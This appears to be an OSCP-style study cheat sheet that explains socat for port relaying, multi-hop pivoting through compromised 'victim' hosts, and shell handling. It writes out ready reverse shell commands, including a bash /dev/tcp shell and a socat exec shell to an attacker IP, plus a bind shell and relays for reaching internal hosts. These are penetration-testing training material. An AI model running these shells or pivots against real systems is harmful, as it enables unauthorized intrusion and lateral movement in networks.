### Socat — Full Breakdown

---

### What is Socat and Why Use It

```
SSH  →  needs SSH service
Chisel →  needs binary upload, connects to your server
Socat  →  just a PIPE between two sockets
           no server needed on your kali
           just runs standalone on victim or any hop

Use Socat when:
├── No SSH, no chisel server needed
├── You need a simple relay on an intermediate host
├── Multi-hop pivoting (victim1 → victim2 → target)
├── Quick port relay without setting up tunnels
└── Upgrading bind/reverse shells
```

---

### Core Mental Model

```
Socat is just a PIPE

LEFT SIDE  ──── socat ────  RIGHT SIDE

Whatever comes in on LEFT goes out RIGHT
Whatever comes in on RIGHT goes out LEFT

That is literally it.
```

---

### Syntax

bash

```bash
socat [OPTIONS] [ADDRESS1] [ADDRESS2]
```

```
socat   TCP-LISTEN:8080,fork    TCP:127.0.0.1:80
          │                       │
          │                       └── RIGHT side — where to send traffic
          └─────────────────────────── LEFT side  — where to receive traffic

fork = handle multiple connections
       without fork it dies after first connection
```

---

### All Scenarios

---

#### Scenario 1 — Simple Port Relay

**"Expose victim's localhost service to outside"**

```
Problem:
Service running on victim's 127.0.0.1:80
You can reach victim's external IP but NOT its localhost

Solution: run socat ON VICTIM
```

bash

```bash
# Run ON VICTIM
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
```

```
Breaking down:

socat  TCP-LISTEN:8080,fork   TCP:127.0.0.1:80
            │                       │
            │                       └── connect to victim's own localhost:80
            └─────────────────────────── listen on victim's port 8080
                                         (reachable from outside)
```

```
Flow:

YOUR KALI              VICTIM                      SERVICE
──────────             ──────────────              ───────
curl                   socat listening
VICTIM_IP:8080 ──────► on :8080
                            │
                            │ pipes to
                            ▼
                       127.0.0.1:80 ──────────────► web app
                       (victim's own
                        localhost)
```

---

#### Scenario 2 — Pivot Relay to Internal Host

**"Use victim to reach a machine only it can talk to"**

```
Problem:
192.168.1.20:445 exists but only victim can reach it
You cannot reach 192.168.1.20 directly

Solution: run socat ON VICTIM as relay
```

bash

```bash
# Run ON VICTIM
socat TCP-LISTEN:4445,fork TCP:192.168.1.20:445
```

```
Flow:

YOUR KALI              VICTIM                      INTERNAL HOST
──────────             ──────────────              ─────────────
smbclient              socat listening             192.168.1.20
//VICTIM_IP/share      on :4445
        │                   │
        └──► VICTIM:4445 ──►│ pipes to
                             ▼
                        192.168.1.20:445 ──────────► SMB service
```

bash

```bash
# Now on your kali you can hit internal host through victim
smbclient //VICTIM_IP/share -p 4445
crackmapexec smb VICTIM_IP:4445
evil-winrm -i VICTIM_IP -p 4445 ...
```

---

#### Scenario 3 — Double Pivot (Multi-hop)

**"Jump through TWO victims to reach deep internal host"**

```
Problem:
You ──► Victim1 ──► Victim2 ──► Target:80
        (reachable) (internal)   (deep internal)

You cannot reach Victim2 directly
Victim2 cannot be reached except through Victim1
```

bash

```bash
# Run ON VICTIM1 — relay to victim2
socat TCP-LISTEN:8080,fork TCP:192.168.1.20:8080

# Run ON VICTIM2 — relay to target
socat TCP-LISTEN:8080,fork TCP:192.168.2.30:80
```

```
Flow:

YOUR KALI        VICTIM1              VICTIM2              TARGET
──────────       ──────────           ──────────           ──────
curl             socat                socat                web app
VICTIM1:8080 ──► :8080 ──────────►   :8080 ──────────►   :80
                 pipes to             pipes to
                 VICTIM2:8080         TARGET:80
```

---

#### Scenario 4 — Reverse Shell Relay

**"Catch a reverse shell through an intermediate host"**

```
Problem:
Target can only reach Victim1
Target cannot reach your kali directly
You need the reverse shell to arrive at your kali

Solution: socat on Victim1 relays shell back to you
```

bash

```bash
# YOUR KALI — start listener
nc -lvnp 4444

# Run ON VICTIM1 — relay incoming shell to your kali
socat TCP-LISTEN:4444,fork TCP:YOUR_KALI_IP:4444

# On TARGET — send reverse shell to victim1
bash -i >& /dev/tcp/VICTIM1_IP/4444 0>&1
```

```
Flow:

YOUR KALI          VICTIM1 (relay)       TARGET
──────────         ──────────────        ──────
nc -lvnp 4444      socat                 bash reverse
        ▲          TCP-LISTEN:4444  ◄─── shell to
        │          pipes to              VICTIM1:4444
        └──────────YOUR_KALI:4444
```

---

#### Scenario 5 — Shell Upgrading

**"Upgrade a basic netcat shell to a full TTY"**

bash

```bash
# YOUR KALI — listen with socat
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# ON VICTIM — connect back with socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:YOUR_IP:4444
```

```
Result:
├── Full TTY shell
├── Tab completion works
├── Arrow keys work
├── Ctrl+C works without killing shell
└── Vim/nano work properly
```

---

#### Scenario 6 — Bind Shell

**"Victim listens, you connect to it"**

bash

```bash
# ON VICTIM — open bind shell
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# YOUR KALI — connect to it
socat - TCP:VICTIM_IP:4444
# or just
nc VICTIM_IP 4444
```

---

### Socat vs SSH vs Chisel — Where Each Fits

```
┌────────────────────────────────────────────────────────────────────────────┐
│  NEED                        SSH          CHISEL        SOCAT              │
├────────────────────────────────────────────────────────────────────────────┤
│  Access victim localhost     -L           R:PORT        TCP-LISTEN relay   │
│  Full network SOCKS proxy    -D / -R      R:socks       ✗ (not supported)  │
│  Multi-hop relay             ✗ complex    ✗ complex     ✅ simple           │
│  Relay without server        ✗            ✗             ✅ standalone       │
│  Upgrade shell to TTY        ✗            ✗             ✅ yes              │
│  Needs binary on victim      NO           YES           YES                │
│  Works on Windows            needs OpenSSH YES           YES               │
│  SOCKS proxy support         YES          YES           NO                 │
└────────────────────────────────────────────────────────────────────────────┘
```

---

### Key Differences From SSH and Chisel

```
SSH and Chisel:                     Socat:
───────────────                     ──────
Create tunnels                      Creates pipes
Have server/client roles            Standalone, no server needed
Support SOCKS proxy                 NO SOCKS support
Traffic encrypted                   NOT encrypted (plaintext)
Good for full pivoting              Good for simple relaying
```

---

### OSCP Decision Flow — Now Complete

```
Need to pivot / forward ports?
│
├── SSH available?
│    ├── One port?         → ssh -L
│    └── Full network?     → ssh -D + proxychains
│
├── No SSH, can upload binary?
│    ├── Full network pivot needed?
│    │    └── Chisel R:socks + proxychains
│    │
│    └── Simple relay / multi-hop?
│         └── Socat TCP-LISTEN:fork TCP:dest
│
└── Need to relay shell through intermediate host?
     └── Socat TCP-LISTEN:4444 TCP:YOUR_IP:4444
```

---

### Quick Cheatsheet

bash

```bash
# Expose victim's local service
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80

# Relay to internal host
socat TCP-LISTEN:4445,fork TCP:192.168.1.20:445

# Relay reverse shell
socat TCP-LISTEN:4444,fork TCP:YOUR_IP:4444

# Bind shell on victim
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# Full TTY reverse shell — your kali
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Full TTY reverse shell — victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:YOUR_IP:4444
```

---

### One Line Summary

```
SSH    →  tunnel with encryption, needs SSH service
Chisel →  tunnel over HTTP, needs server on your kali
Socat  →  dumb pipe, no server needed, perfect for relaying
           and multi-hop but NO SOCKS proxy support
```